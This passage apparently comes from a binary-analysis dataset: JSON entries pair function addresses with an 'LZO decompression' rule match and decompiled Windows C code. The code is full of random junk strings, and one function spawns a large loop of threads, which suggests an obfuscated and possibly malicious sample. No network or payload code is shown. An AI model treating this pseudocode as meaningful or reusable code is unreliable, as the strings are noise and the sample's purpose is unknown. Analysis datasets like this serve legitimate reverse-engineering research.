 uStack212 = 0xf;\n    aiStack232[0] = 0;\n    uStack164 = 7;\n    fcn.00402f72(0x1b, iStack208, \"fobbhtzqrkcimxnsebyvgzrouuh\");\n    uStack192 = 0;\n    uStack188 = 0xf;\n    iStack208 = 0;\n    uStack164 = 8;\n    fcn.00402f72(0x17, uStack180, \"hlctamgpzzidyfpfputvxwq\");\n    *puStack184 = 0;\n    puStack184[4] = 0;\n    puStack184[5] = 0xf;\n    *puStack184 = 0;\n    uStack164 = 9;\n    fcn.00402f72(0x13, uStack180, \"mdunvuihxjybpqbxiif\");\n    if (uStack188 < 0x10) {\ncode_r0x0041251c:\n        if (0xf < uStack212) {\n            iVar3 = aiStack232[0];\n            if ((0xfff < uStack212 + 1) && (iVar3 = *(aiStack232[0] + -4),  0x1f < (aiStack232[0] + -4) - iVar3))\n            goto code_r0x004126e5;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < pcStack108) {\n            iVar3 = in_stack_ffffff80;\n            if ((0xfff < pcStack108 + 1) &&\n               (iVar3 = *(in_stack_ffffff80 + -4),  0x1f < (in_stack_ffffff80 + -4) - iVar3)) goto code_r0x004126f1;\n            fcn.00401a32(iVar3);\n        }\n        uStack112 = 0;\n        pcStack108 = 0xf;\n        if (0xf < uStack84) {\n            uVar2 = uStack104;\n            if ((0xfff < uStack84 + 1) && (uVar2 = *(uStack104 - 4),  0x1f < (uStack104 - 4) - uVar2))\n            goto code_r0x004126fd;\n            fcn.00401a32(uVar2);\n        }\n        uStack88 = 0;\n        uStack84 = 0xf;\n        uStack104 = uStack104 & 0xffffff00;\n        if (0xf < uStack60) {\n            uVar2 = uStack80;\n            if ((0xfff < uStack60 + 1) && (uVar2 = *(uStack80 - 4),  0x1f < (uStack80 - 4) - uVar2))\n            goto code_r0x00412709;\n            fcn.00401a32(uVar2);\n        }\n        uStack64 = 0;\n        uStack60 = 0xf;\n        uStack80 = uStack80 & 0xffffff00;\n        if (0xf < uStack24) {\n            iVar3 = iStack44;\n            if ((0xfff < uStack24 + 1) && (iVar3 = *(iStack44 + -4),  0x1f < (iStack44 + -4) - iVar3))\n            goto code_r0x00412715;\n            fcn.00401a32(iVar3);\n        }\n        piStack28 = NULL;\n        uStack24 = 0xf;\n        if (0xf < unaff_retaddr) {\n            iVar3 = iStack20;\n            if ((0xfff < unaff_retaddr + 1) && (iVar3 = *(iStack20 + -4),  0x1f < (iStack20 + -4) - iVar3))\n            goto code_r0x00412721;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack172;\n        return puStack140;\n    }\n    iVar3 = iStack208;\n    if ((uStack188 + 1 < 0x1000) || (iVar3 = *(iStack208 + -4),  (iStack208 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x0041251c;\n    }\n    uStack164 = 0;\n    fcn.004047f5();\ncode_r0x004126e5:\n    uStack164 = 1;\n    fcn.004047f5();\ncode_r0x004126f1:\n    uStack164 = 2;\n    fcn.004047f5();\ncode_r0x004126fd:\n    uStack164 = 3;\n    fcn.004047f5();\ncode_r0x00412709:\n    uStack164 = 4;\n    fcn.004047f5();\ncode_r0x00412715:\n    uStack164 = 5;\n    fcn.004047f5();\ncode_r0x00412721:\n    uStack164 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 2126
    },
    "00412820": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t * fcn.00412820(uint32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t arg_8h;\n    int32_t unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint uStack92;\n    uchar uStack88;\n    char *pcStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint *in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414a10;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (0xf < in_stack_00000030) {\n        iStack60 = in_stack_0000001c;\n        if ((0xfff < in_stack_00000030 + 1) &&\n           (iStack60 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iStack60)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            puStack76 = &uStack92;\n            uStack68 = 0x414a20;\n            piStack72 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &piStack72;\n            *in_stack_ffffffd8 = 0;\n            in_stack_ffffffd8[4] = 0;\n            in_stack_ffffffd8[5] = 0xf;\n            *in_stack_ffffffd8 = 0;\n            uStack64 = 1;\n            uStack88 = uStack80;\n            pcStack84 = \"nalbxgafjxczsppfsj\";\n            uStack92 = 0x12;\n            fcn.00402f72();\n            if (0xf < param_1) {\n                arg_8h = unaff_ESI;\n                if ((0xfff < param_1 + 1) && (arg_8h = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - arg_8h)) {\n                    uStack64 = 0;\n                    fcn.004047f5();\n                    fcn.004052d1();\n                    puVar1 = fcn.00403a76();\n                    return puVar1;\n                }\n                fcn.00401a32(arg_8h);\n            }\n            *in_FS_OFFSET = piStack72;\n            return in_stack_ffffffd8;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n    }\n    *in_FS_OFFSET = piStack28;\n    return piStack28;\n}\n",
        "token_count": 693
    },
    "004129c0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004129c0(uint32_t param_1, uint param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_ffffff44;\n    uint32_t in_stack_ffffff50;\n    int32_t aiStack156 [4];\n    uint uStack140;\n    uint32_t uStack136;\n    uint32_t uStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint8_t uStack80;\n    int32_t *piStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414a30;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x00412a24:\n        *in_FS_OFFSET = piStack28;\n        return 0x1361d;\n    }\n    iStack60 = param_3;\n    if ((in_stack_00000020 + 1 < 0x1000) || (iStack60 = *(param_3 + -4),  (param_3 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x00412a24;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack76 = aiStack156;\n    uStack68 = 0x414a40;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    aiStack156[0] = 0;\n    uStack64 = 4;\n    fcn.00402f72(0x62, iStack108, \n                 \"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    uVar1 = 0;\n    while (uStack64 = 5,  uVar1 < 0x5fbf) {\n        uStack84 = uVar1;\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(5);\n        in_stack_ffffff50 = 0;\n        in_stack_ffffff44 = 0x4031c5;\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x4031c5, 0, 0);\n        uVar1 = uStack84 + 1;\n    }\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    fcn.00402f72(0x62, in_stack_ffffff50 & 0xffffff00 | uStack132 & 0xff, \n                 \"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    uStack116 = 0;\n    uStack112 = 0xf;\n    uStack132 = 0;\n    uStack64 = 6;\n    fcn.00402f72(0x62, in_stack_ffffff44 & 0xffffff00 | uStack80, \n                 \"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    if (uStack112 < 0x10) {\ncode_r0x00412bb9:\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00412c7d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = aiStack156[0];\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(aiStack156[0] + -4),  0x1f < (aiStack156[0] + -4) - iVar2))\n            goto code_r0x00412c89;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < param_1) {\n            iVar2 = unaff_ESI;\n            if ((0xfff < param_1 + 1) && (iVar2 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar2))\n            goto code_r0x00412c95;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iVar2 = uStack132;\n    if ((uStack112 + 1 < 0x1000) || (iVar2 = *(uStack132 + -4),  (uStack132 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00412bb9;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x00412c7d:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x00412c89:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x00412c95:\n    uStack64 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar2 = fcn.00403a76();\n    return iVar2;\n}\n",
        "token_count": 1536
    },
    "004208a0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.004208a0(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c0c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    param_1[5] = 0xf;\n    param_1[4] = 0xe;\n    *param_1 = 0x6d666978;\n    param_1[1] = 0x6668706e;\n    param_1[2] = 0x68676b7a;\n    *(param_1 + 3) = 0x7867;\n    *(param_1 + 0xe) = 0;\n    if (0xf < in_stack_00000020) {\n        arg_8h = param_3;\n        if ((0xfff < in_stack_00000020 + 1) && (arg_8h = *(param_3 + -4),  0x1f < (param_3 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            return NULL;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 398
    },
    "00420980": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.00420980(uint param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c0d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (0xf < in_stack_0000001c) {\n        arg_8h = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (arg_8h = *(param_2 + -4),  0x1f < (param_2 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            return;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 288
    },
    "00423070": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t * fcn.00423070(void)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint32_t unaff_EBP;\n    int32_t **in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    uint32_t in_stack_00000014;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    uint auStack152 [4];\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c160;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_0000002c < 0x10) {\ncode_r0x004230d4:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    iStack60 = in_stack_00000018;\n    if ((in_stack_0000002c + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_00000018 + -4),  (in_stack_00000018 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x004230d4;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = auStack152;\n    uStack68 = 0x44c170;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack132 = 0xf;\n    uStack136 = 1;\n    auStack152[0] = 0x72;\n    uStack108 = 0xf;\n    uStack112 = 7;\n    uStack128 = 0x66676275;\n    uStack124 = 0x696e78;\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 3;\n    fcn.00402f72(0x28, uStack80, \"zamwttatgmlltegzwyjzuvynovzqgalicilchazc\");\n    if (uStack84 < 0x10) {\ncode_r0x004231f1:\n        if (0xf < unaff_EBP) {\n            arg_8h = uStack24;\n            if ((0xfff < unaff_EBP + 1) && (arg_8h = *(uStack24 - 4),  0x1f < (uStack24 - 4) - arg_8h))\n            goto code_r0x00423293;\n            fcn.00401a32(arg_8h);\n        }\n        uStack24 = uStack24 & 0xffffff00;\n        if (0xf < in_stack_00000014) {\n            iVar1 = unaff_retaddr;\n            if ((0xfff < in_stack_00000014 + 1) && (iVar1 = *(unaff_retaddr + -4),  0x1f < (unaff_retaddr + -4) - iVar1)\n               ) goto code_r0x0042329f;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack72;\n        return 1;\n    }\n    iVar1 = iStack104;\n    if ((uStack84 + 1 < 0x1000) || (iVar1 = *(iStack104 + -4),  (iStack104 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x004231f1;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x00423293:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x0042329f:\n    uStack64 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 1123
    },
    "00423bf0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.00423bf0(int32_t param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    uint *puVar12;\n    int32_t *in_FS_OFFSET;\n    uint auStack120 [9];\n    uint uStack84;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    uchar *puStack48;\n    uint *puStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack44 = &stack0xffffffc4;\n    puStack32 = &stack0xffffffc4;\n    uStack24 = 0x44c1b0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack56 = param_1 + 4;\n    *(param_1 + 4) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4) = 0;\n    iStack52 = param_1 + 0x3c;\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x4c) = 0;\n    *(param_1 + 0x50) = 0xf;\n    *(param_1 + 0x3c) = 0;\n    puStack40 = &stack0xffffff88;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 1;\n    iStack60 = param_1;\n    fcn.00402f72(0x3b);\n    puVar4 = puStack40;\n    *puStack40 = 0xc05;\n    uVar2 = *0x541ffc;\n    uVar1 = *0x541ff8;\n    uVar6 = *0x541ff4;\n    puVar4[1] = *0x541ff0;\n    puVar4[2] = uVar6;\n    puVar4[3] = uVar1;\n    puVar4[4] = uVar2;\n    puVar4[5] = 0x279;\n    puVar4[7] = 0x40ce8280;\n    puVar4[6] = 0;\n    *(puVar4 + 8) = 0;\n    uVar6 = fcn.00403fdf();\n    puVar3 = puStack44;\n    *(puStack44 + -4) = uVar6;\n    puStack40 = puVar3 + -0x38;\n    puStack48 = puVar3 + -0x20;\n    *(puVar3 + -0x20) = 0;\n    *(puVar3 + -0x10) = 0;\n    *(puVar3 + -0xc) = 0xf;\n    puVar3[-0x20] = 0;\n    puVar3[-0x40] = uStack36;\n    *(puVar3 + -0x3c) = \"bnazhlkklnanlpnunoabumtysgyacpdyzkloextafgqnieyuimozgvb\";\n    *(puVar3 + -0x44) = 0x37;\n    *(puVar3 + -0x48) = 0x423d26;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *puStack40 = 0;\n    puVar4[4] = 0;\n    puVar4[5] = 0xf;\n    *puVar4 = 0;\n    uStack20 = 4;\n    puVar3[-0x4c] = uStack36;\n    *(puVar3 + -0x48) = \"rovcgqmuxownfeyjxycksqzllmdhjjxcvjogmbiidbuwlmzuuqnpjvgcjkknheajloojczaftsqqwckxbxw\";\n    *(puVar3 + -0x50) = 0x53;\n    *(puVar3 + -0x54) = 0x423d65;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[0xc] = 0x1428;\n    puVar4[0xd] = 0x14a3;\n    uStack20 = 1;\n    *(puVar3 + -0x54) = 0x423d82;\n    uVar6 = fcn.00402b49();\n    puVar3 = puStack44;\n    *(puStack44 + -4) = uVar6;\n    puStack40 = puVar3 + -0x34;\n    *(puVar3 + -0x20) = 0;\n    *(puVar3 + -0x10) = 0;\n    *(puVar3 + -0xc) = 0xf;\n    puVar3[-0x20] = 0;\n    puVar3[-0x3c] = uStack36;\n    *(puVar3 + -0x38) = \"jjweelaxaajumwfqpzjureieirulkwseaamxazvmodapygmoskwnbmgfbp\";\n    *(puVar3 + -0x40) = 0x3a;\n    *(puVar3 + -0x44) = 0x423dca;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[1] = 0x40e39980;\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    *(puVar4 + 3) = 1;\n    *(puVar4 + 4) = 1;\n    puVar4[0xb] = 0x528;\n    puVar4[0xc] = 0xc89;\n    uVar8 = puVar4[10];\n    if (0xf < uVar8) {\n        iVar9 = puVar4[5];\n        uVar7 = uVar8 + 1;\n        iVar10 = iVar9;\n        if (0xfff < uVar7) {\n            iVar10 = *(iVar9 + -4);\n            if (0x1f < (iVar9 + -4) - iVar10) {\n                uStack20 = 0;\n                *(puVar3 + -0x44) = 0x42410a;\n                fcn.004047f5();\n                *(puVar3 + -0x44) = &stack0xfffffffc;\n                *(puVar3 + -0x9c) = 0x42411c;\n                fcn.004052d1();\n                *(puVar3 + -0x9c) = &stack0x00000008;\n                *(puVar3 + -0xf4) = 0x42412f;\n                iVar9 = fcn.00403a76();\n                return iVar9;\n            }\n            uVar7 = uVar8 + 0x24;\n        }\n        *(puVar3 + -0x44) = uVar7;\n        *(puVar3 + -0x48) = iVar10;\n        *(puVar3 + -0x4c) = 0x423e29;\n        uVar8 = fcn.00401a32(*(puVar3 + -0x48));\n    }\n    puVar3 = puStack44;\n    *(puStack44 + -4) = uVar8;\n    puStack40 = puVar3 + -0x48;\n    puStack48 = puVar3 + -0x20;\n    *(puVar3 + -0x20) = 0;\n    *(puVar3 + -0xc) = 0xf;\n    *(puVar3 + -0x10) = 0;\n    puVar3[-0x20] = 0;\n    *(puVar3 + -0x38) = 0;\n    *(puVar3 + -0x28) = 0;\n    *(puVar3 + -0x24) = 0xf;\n    puVar3[-0x38] = 0;\n    uStack20 = 3;\n    puVar3[-0x50] = uStack36;\n    *(puVar3 + -0x4c) = \"qwpmlbkeiaesichkrzcqnyakmnrsgqsedqfffgllnlhjkvweshoqzgwtwjbmv\";\n    *(puVar3 + -0x54) = 0x3d;\n    *(puVar3 + -0x58) = 0x423e98;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *puStack40 = *0x542010;\n    puVar4[1] = *0x542014;\n    puVar4[2] = *0x542018;\n    puVar4[3] = *0x54201c;\n    puVar4[0x11] = 0x40e09dc0;\n    puVar4[0x10] = 0;\n    uStack20 = 1;\n    *(puVar3 + -0x58) = 0x423ebf;\n    fcn.00406537();\n    puVar3 = puStack44;\n    puVar11 = puStack44 + -0x18;\n    *(puStack44 + -4) = 0;\n    *(puVar3 + -0x1c) = 0x423ed2;\n    uVar6 = fcn.004051d2();\n    puStack44 = puVar11;\n    *(puVar3 + -0x1c) = uVar6;\n    puStack40 = puVar3 + -0x6c;\n    puStack48 = puVar3 + -0x34;\n    *(puVar3 + -0x34) = 0;\n    *(puVar3 + -0x24) = 0;\n    *(puVar3 + -0x20) = 0xf;\n    puVar3[-0x34] = 0;\n    puVar3[-0x74] = uStack36;\n    *(puVar3 + -0x70) = \"ibrngprehbgwcripz\";\n    *(puVar3 + -0x78) = 0x11;\n    *(puVar3 + -0x7c) = 0x423f1b;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[2] = 0;\n    puVar4[6] = 0;\n    puVar4[7] = 0xf;\n    *(puVar4 + 2) = 0;\n    uStack20 = 2;\n    puVar3[-0x80] = uStack36;\n    *(puVar3 + -0x7c) = \"terxynjofdpppoqhcbkmvbzdbxdtizxbfdeivqkljesgcesdcxlwhitcjrogceocqxnnhzqnpnlqzhfmyvjitv\";\n    *(puVar3 + -0x84) = 0x56;\n    *(puVar3 + -0x88) = 0x423f61;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[1] = 0x40e476c0;\n    *puVar4 = 0;\n    puVar4[8] = *0x542030;\n    puVar4[9] = *0x542034;\n    puVar4[10] = *0x542038;\n    puVar4[0xb] = *0x54203c;\n    puVar4[0xc] = 0x10f1;\n    puVar4[0xd] = 0x516;\n    puVar4[0x14] = 0x18a4;\n    *(puVar3 + -0x88) = 0x423f96;\n    uVar6 = fcn.004024f5();\n    puVar3 = puStack44;\n    *(puStack44 + -4) = uVar6;\n    puStack40 = puVar3 + -0x1c;\n    *(puVar3 + -0x1c) = 0;\n    *(puVar3 + -0xc) = 0;\n    *(puVar3 + -8) = 0xf;\n    puVar3[-0x1c] = 0;\n    uStack20 = 1;\n    puVar3[-0x24] = uStack36;\n    *(puVar3 + -0x20) = \"kcctodewkqsopidptjxpwcaphgqytgnkwn\";\n    *(puVar3 + -0x28) = 0x22;\n    *(puVar3 + -0x2c) = 0x423fe0;\n    fcn.00402f72();\n    *(puStack40 + 0x18) = 0x554;\n    *(puVar3 + -0x2c) = 0x423fef;\n    fcn.00402333();\n    puVar3 = puStack44;\n    *(puStack44 + -4) = 0x423ff7;\n    fcn.00404a8e();\n    puStack40 = puVar3;\n    puStack44 = puVar3 + -0x48;\n    *(puVar3 + -0x1c) = 0;\n    *(puVar3 + -0xc) = 0;\n    *(puVar3 + -8) = 0xf;\n    puVar3[-0x1c] = 0;\n    puVar3[-0x50] = uStack36;\n    *(puVar3 + -0x4c) = \"cumezxloyibegwrczobhdnrknzienieemlpitlctexpmfumvxehgwasnuevlofusskveykvfmoh\";\n    *(puVar3 + -0x54) = 0x4b;\n    *(puVar3 + -0x58) = 0x42403c;\n    fcn.00402f72();\n    puVar4 = puStack44;\n    puStack44[10] = 0xf;\n    puVar4[9] = 4;\n    puVar4[5] = 0x62707179;\n    *(puVar4 + 6) = 0;\n    puVar4[1] = 0x40e4da00;\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4[4] = 0x40d3b200;\n    puVar4[3] = 0;\n    puVar4[0x11] = 0x2be;\n    *(puVar3 + -0x58) = 0x424083;\n    uVar6 = fcn.0040544d();\n    puVar3 = puStack40;\n    puStack44 = puStack40;\n    *(puStack40 + -4) = uVar6;\n    *(puStack40 + -0x20) = 0;\n    *(puStack40 + -0x10) = 0;\n    *(puStack40 + -0xc) = 0xf;\n    *(puStack40 + -0x20) = 0;\n    *(puStack40 + -0x28) = uStack36;\n    *(puStack40 + -0x24) = \"vaqyovogacyvwusevresepkmgwmftsnwvcpixwgdyvuceexodqepphrubpcbalt\";\n    *(puStack40 + -0x2c) = 0x3f;\n    puVar12 = puStack40 + -0x30;\n    puStack40 = puStack40 + -0x20;\n    *puVar12 = 0x4240c9;\n    fcn.00402f72();\n    puVar5 = puStack40;\n    *(puStack40 + 0x1c) = 0x40e82aa0;\n    *(puVar5 + 0x18) = 0;\n    *(puVar3 + -0x30) = 0x4240df;\n    fcn.00405e5c();\n    *(puStack44 + -0x18) = 0x4240ea;\n    fcn.0040560f();\n    *in_FS_OFFSET = iStack28;\n    return iStack60;\n}\n",
        "token_count": 3800
    },
    "004255e0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t * fcn.004255e0(uint param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c220;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (0xf < in_stack_0000001c) {\n        arg_8h = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (arg_8h = *(param_2 + -4),  0x1f < (param_2 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            return 0x329;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return piStack28;\n}\n",
        "token_count": 297
    },
    "00426c70": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.00426c70(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    int32_t *piVar15;\n    int32_t *piVar16;\n    int32_t *piVar17;\n    int32_t *piVar19;\n    int32_t *piVar20;\n    int32_t *in_FS_OFFSET;\n    int32_t aiStack272 [10];\n    uint uStack232;\n    uint uStack216;\n    uint uStack212;\n    int32_t iStack196;\n    uint32_t auStack192 [4];\n    uint uStack176;\n    uint32_t uStack172;\n    uint32_t uStack168;\n    uint uStack152;\n    uint32_t uStack148;\n    uint32_t uStack144;\n    uint uStack128;\n    uint32_t uStack124;\n    uint32_t uStack120;\n    uint uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint uStack80;\n    uint32_t uStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    uint *puStack52;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar 